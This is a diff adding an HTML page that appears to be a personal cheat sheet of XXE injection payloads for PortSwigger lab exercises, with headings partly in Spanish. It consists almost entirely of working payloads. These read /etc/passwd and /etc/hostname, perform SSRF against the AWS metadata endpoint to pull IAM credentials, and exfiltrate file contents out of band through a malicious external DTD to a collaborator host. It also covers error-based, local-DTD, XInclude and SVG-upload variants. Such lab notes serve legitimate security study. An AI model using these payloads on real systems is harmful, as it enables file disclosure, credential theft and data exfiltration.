@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>XXE Injection | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="../writeups/writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../portswigger.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">XXE Injection</span>
+        <span class="badge bg-secondary">XML</span>
+        <span class="badge bg-secondary">File Read</span>
+        <span class="badge bg-secondary">SSRF</span>
+        <span class="badge bg-secondary">Blind</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">XXE Injection</h1>
+      <p class="text-secondary mb-0">XML External Entity injection para lectura de archivos, SSRF y exfiltración de datos out-of-band.</p>
+    </div>
+
+    <!-- Custom entities -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-code-slash"></i> Entidades XML personalizadas</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">XML</span></div>
+        <pre><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity "my entity value" &gt; ]&gt;</code></pre>
+      </div>
+    </section>
+
+    <!-- Retrieve files -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-file-earmark-text"></i> Exploiting XXE — Retrieve files</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">XML — /etc/passwd</span></div>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;
+    &amp;xxe;
+  &lt;/productId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+    </section>
+
+    <!-- XXE to SSRF -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-arrow-left-right"></i> Exploiting XXE — SSRF attacks</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">XML — AWS metadata</span></div>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"&gt; ]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&amp;xxe;&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+    </section>
+
+    <!-- Blind OOB -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-eye-slash"></i> Blind XXE — Out-of-band interaction</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">Basic OOB</span></div>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR.oastify.com"&gt; ]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&amp;xxe;&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">Via XML parameter entities (%)</span></div>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR.oastify.com"&gt; %xxe; ]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&lt;/productId&gt;
+  &lt;storeId&gt;2&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+    </section>
+
+    <!-- Exfiltrate via external DTD -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-box-arrow-up-right"></i> Blind XXE — Exfiltrate data via malicious external DTD</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">Request XML</span></div>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
+"https://EXPLOIT-SERVER.exploit-server.net/exploit"&gt; %xxe;]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-header"><span class="text-info">Payload en servidor externo (exploit)</span></div>
+        <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://COLLABORATOR.oastify.com/?x=%file;'&gt;"&gt;
+%eval;
+%exfiltrate;</code></pre>
+      </div>
+    </section>
+
+    <!-- Error messages -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-exclamation-triangle"></i> Blind XXE — Retrieve data via error messages</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">Request XML</span></div>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
+"https://EXPLOIT-SERVER.exploit-server.net/exploit"&gt; %xxe;]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-header"><span class="text-info">Payload en servidor externo (error)</span></div>
+        <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;</code></pre>
+      </div>
+    </section>
+
+    <!-- Local DTD -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-hdd"></i> Exploiting XXE — Repurpose a local DTD</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">XML</span></div>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
+  &lt;!ENTITY % ISOamso '
+    &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
+    &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
+    &amp;#x25;eval;
+    &amp;#x25;error;
+  '&gt;
+  %local_dtd;
+]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+      </div>
+    </section>
+
+    <!-- Hidden attack surface -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-binoculars"></i> Hidden attack surface</h4>
+      <div class="mb-4">
+        <h6 class="text-warning">XInclude attacks</h6>
+        <div class="code-block">
+          <pre><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;</code></pre>
+        </div>
+      </div>
+      <div class="mb-4">
+        <h6 class="text-warning">XXE via file upload (SVG)</h6>
+        <div class="code-block">
+          <pre><code>&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;
+&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
+  &lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- % encoding -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-percent"></i> Otras formas de codificar <code>%</code></h4>
+      <div class="code-block">
+        <pre><code>&amp;#x25;
+&amp;#37;</code></pre>
+      </div>
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
